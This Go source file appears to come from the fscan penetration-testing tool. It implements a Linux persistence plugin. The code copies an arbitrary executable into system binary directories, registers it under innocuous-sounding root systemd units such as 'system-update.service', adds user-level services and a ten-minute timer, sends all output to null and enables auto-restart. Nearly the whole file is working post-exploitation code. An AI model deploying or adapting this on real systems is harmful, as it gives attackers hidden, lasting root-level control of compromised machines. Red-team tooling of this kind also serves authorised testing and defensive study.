//go:build (plugin_systemdservice || !plugin_selective) && linux && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// SystemdServicePlugin 系统服务插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现系统服务持久化功能
// - 保持原有功能逻辑
type SystemdServicePlugin struct {
	plugins.BasePlugin
}

// NewSystemdServicePlugin 创建系统服务持久化插件
func NewSystemdServicePlugin() *SystemdServicePlugin {
	return &SystemdServicePlugin{
		BasePlugin: plugins.NewBasePlugin("systemdservice"),
	}
}

// Scan 执行系统服务持久化 - 直接实现
func (p *SystemdServicePlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	var output strings.Builder

	if runtime.GOOS != "linux" {
		output.WriteString(i18n.GetText("systemdservice_linux_only") + "\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("%s", i18n.Tr("unsupported_platform", runtime.GOOS)),
		}
	}

	// 从config获取配置
	targetFile := config.PersistenceTargetFile
	if targetFile == "" {
		output.WriteString(i18n.GetText("persistence_file_required") + "\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("%s", i18n.GetText("target_file_not_specified")),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(targetFile); os.IsNotExist(err) {
		output.WriteString(i18n.Tr("target_file_not_exist", targetFile) + "\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查systemctl是否可用
	if _, err := exec.LookPath("systemctl"); err != nil {
		output.WriteString(i18n.Tr("systemctl_unavailable", err) + "\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString(i18n.GetText("systemdservice_header") + "\n")
	output.WriteString(i18n.Tr("local_target_file", targetFile) + "\n")
	output.WriteString(i18n.Tr("local_platform", runtime.GOOS) + "\n\n")

	var successCount int

	// 1. 复制文件到服务目录
	servicePath, err := p.copyToServicePath(targetFile)
	if err != nil {
		output.WriteString(i18n.Tr("copy_file_failed", err) + "\n")
	} else {
		output.WriteString(i18n.Tr("file_copied_to", servicePath) + "\n")
		successCount++
	}

	// 2. 创建systemd服务文件
	serviceFiles, err := p.createSystemdServices(servicePath)
	if err != nil {
		output.WriteString(i18n.Tr("systemdservice_create_failed", err) + "\n")
	} else {
		output.WriteString(i18n.Tr("systemdservice_created", strings.Join(serviceFiles, ", ")) + "\n")
		successCount++
	}

	// 3. 启用并启动服务
	err = p.enableAndStartServices(serviceFiles)
	if err != nil {
		output.WriteString(i18n.Tr("systemdservice_start_failed", err) + "\n")
	} else {
		output.WriteString(i18n.GetText("systemdservice_started") + "\n")
		successCount++
	}

	// 4. 创建用户级服务
	userServiceFiles, err := p.createUserServices(servicePath)
	if err != nil {
		output.WriteString(i18n.Tr("systemdservice_user_create_failed", err) + "\n")
	} else {
		output.WriteString(i18n.Tr("systemdservice_user_created", strings.Join(userServiceFiles, ", ")) + "\n")
		successCount++
	}

	// 5. 创建定时器服务
	err = p.createTimerServices(servicePath)
	if err != nil {
		output.WriteString(i18n.Tr("systemdservice_timer_create_failed", err) + "\n")
	} else {
		output.WriteString(i18n.GetText("systemdservice_timer_created") + "\n")
		successCount++
	}

	// 输出统计
	output.WriteString("\n" + i18n.Tr("systemdservice_complete_summary", successCount, 5) + "\n")

	if successCount > 0 {
		session.LogSuccess(i18n.Tr("systemdservice_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Output:  output.String(),
		Error:   nil,
	}
}

// copyToServicePath 复制文件到服务目录
func (p *SystemdServicePlugin) copyToServicePath(targetFile string) (string, error) {
	// 选择服务目录
	serviceDirs := []string{
		"/usr/local/bin",
		"/opt/local",
		"/usr/bin",
	}

	var targetDir string
	for _, dir := range serviceDirs {
		if err := os.MkdirAll(dir, 0755); err == nil {
			targetDir = dir
			break
		}
	}

	if targetDir == "" {
		return "", fmt.Errorf("%s", i18n.GetText("service_dir_create_failed"))
	}

	// 生成服务可执行文件名
	basename := filepath.Base(targetFile)
	serviceName := strings.TrimSuffix(basename, filepath.Ext(basename))
	if serviceName == "" {
		serviceName = "system-service"
	}

	targetPath := filepath.Join(targetDir, serviceName)

	// 复制文件
	err := p.copyFile(targetFile, targetPath)
	if err != nil {
		return "", err
	}

	// 设置执行权限
	_ = os.Chmod(targetPath, 0755)

	return targetPath, nil
}

// copyFile 复制文件内容
func (p *SystemdServicePlugin) copyFile(src, dst string) error {
	sourceData, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, sourceData, 0755)
}

// createSystemdServices 创建systemd服务文件
func (p *SystemdServicePlugin) createSystemdServices(execPath string) ([]string, error) {
	systemDir := "/etc/systemd/system"
	if err := os.MkdirAll(systemDir, 0755); err != nil {
		return nil, err
	}

	services := []struct {
		name    string
		content string
		enable  bool
	}{
		{
			name:   "system-update.service",
			enable: true,
			content: fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=root
ExecStart=%s
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, execPath),
		},
		{
			name:   "system-monitor.service",
			enable: true,
			content: fmt.Sprintf(`[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=forking
User=root
ExecStart=%s
PIDFile=/var/run/system-monitor.pid
Restart=on-failure
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, execPath),
		},
		{
			name:   "network-check.service",
			enable: false,
			content: fmt.Sprintf(`[Unit]
Description=Network Check Service
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=%s
StandardOutput=null
StandardError=null
`, execPath),
		},
	}

	var created []string
	for _, service := range services {
		servicePath := filepath.Join(systemDir, service.name)
		if err := os.WriteFile(servicePath, []byte(service.content), 0644); err == nil {
			created = append(created, service.name)
		}
	}

	if len(created) == 0 {
		return nil, fmt.Errorf("%s", i18n.GetText("systemdservice_create_none"))
	}

	return created, nil
}

// enableAndStartServices 启用并启动服务
func (p *SystemdServicePlugin) enableAndStartServices(serviceFiles []string) error {
	var errors []string

	for _, serviceName := range serviceFiles {
		// 重新加载systemd配置
		_ = exec.Command("systemctl", "daemon-reload").Run()

		// 启用服务
		if err := exec.Command("systemctl", "enable", serviceName).Run(); err != nil {
			errors = append(errors, fmt.Sprintf("enable %s: %v", serviceName, err))
		}

		// 启动服务
		if err := exec.Command("systemctl", "start", serviceName).Run(); err != nil {
			errors = append(errors, fmt.Sprintf("start %s: %v", serviceName, err))
		}
	}

	if len(errors) > 0 {
		return fmt.Errorf(i18n.GetText("service_operation_error")+": %s", strings.Join(errors, "; "))
	}

	return nil
}

// createUserServices 创建用户级服务
func (p *SystemdServicePlugin) createUserServices(execPath string) ([]string, error) {
	userDir := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
	if userDir == "/.config/systemd/user" { // HOME为空的情况
		userDir = "/tmp/.config/systemd/user"
	}

	if err := os.MkdirAll(userDir, 0755); err != nil {
		return nil, err
	}

	userServices := []string{
		"user-service.service",
		"background-task.service",
	}

	userServiceContent := fmt.Sprintf(`[Unit]
Description=User Background Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
`, execPath)

	var created []string
	for _, serviceName := range userServices {
		servicePath := filepath.Join(userDir, serviceName)
		if err := os.WriteFile(servicePath, []byte(userServiceContent), 0644); err == nil {
			created = append(created, serviceName)

			// 启用用户服务
			_ = exec.Command("systemctl", "--user", "enable", serviceName).Run()
			_ = exec.Command("systemctl", "--user", "start", serviceName).Run()
		}
	}

	return created, nil
}

// createTimerServices 创建定时器服务
func (p *SystemdServicePlugin) createTimerServices(execPath string) error {
	systemDir := "/etc/systemd/system"

	// 创建定时器服务文件
	timerService := fmt.Sprintf(`[Unit]
Description=Scheduled Task Service
Wants=scheduled-task.timer

[Service]
Type=oneshot
ExecStart=%s
StandardOutput=null
StandardError=null
`, execPath)

	// 创建定时器文件
	timerConfig := `[Unit]
Description=Run Scheduled Task Every 10 Minutes
Requires=scheduled-task.service

[Timer]
OnBootSec=5min
OnUnitActiveSec=10min
AccuracySec=1s

[Install]
WantedBy=timers.target
`

	// 写入服务文件
	serviceFile := filepath.Join(systemDir, "scheduled-task.service")
	if err := os.WriteFile(serviceFile, []byte(timerService), 0644); err != nil {
		return err
	}

	// 写入定时器文件
	timerFile := filepath.Join(systemDir, "scheduled-task.timer")
	if err := os.WriteFile(timerFile, []byte(timerConfig), 0644); err != nil {
		return err
	}

	// 启用定时器
	_ = exec.Command("systemctl", "daemon-reload").Run()
	_ = exec.Command("systemctl", "enable", "scheduled-task.timer").Run()
	_ = exec.Command("systemctl", "start", "scheduled-task.timer").Run()

	return nil
}

// 注册插件
func init() {
	RegisterLocalPlugin("systemdservice", func() Plugin {
		return NewSystemdServicePlugin()
	})
}
